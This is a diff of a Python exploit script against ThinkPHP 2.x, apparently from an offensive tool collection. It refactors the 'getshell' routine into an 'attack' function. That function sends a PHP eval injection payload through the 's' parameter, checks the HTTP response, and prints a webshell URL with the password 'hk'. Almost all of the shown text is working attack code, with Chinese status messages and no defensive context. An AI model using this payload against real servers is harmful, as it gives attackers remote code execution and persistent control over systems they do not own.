@@ -15,22 +15,23 @@ def verify(url):
             relsult['method'] = 'GET'
             relsult['url'] = url
             relsult['payload'] = payload
-            relsult['exp'] = True
+            relsult['attack'] = True
         return relsult
     except:
         return relsult
 
 # getshell
-def exp():
-    url = input('输入目标URL:')
-    if verify(url):
-        print('[+] 存在 Thinkphp 2.x rce')
+def attack(url):
+    try:
+        print('[*] 存在 Thinkphp 2.x rce!')
         payload = r'/index.php?s=a/b/c/${@print(eval($_POST[hk]))}'
-        webshell = url + payload
-        print('[+] webshell:', webshell)
-        print('[+] 密码: hk')
-    else:
-        print('不存在漏洞或者有waf!')
+        webshell = urllib.parse.urljoin(url, payload)
+        if requests.get(webshell, timeout=10).status_code == 200:
+            print('[+] webshell:', webshell)
+            print('[+] 密码: hk')
+            return True
+        else:
+            return False
+    except:
+        return False
 
-if __name__ == '__main__':
-    exp()
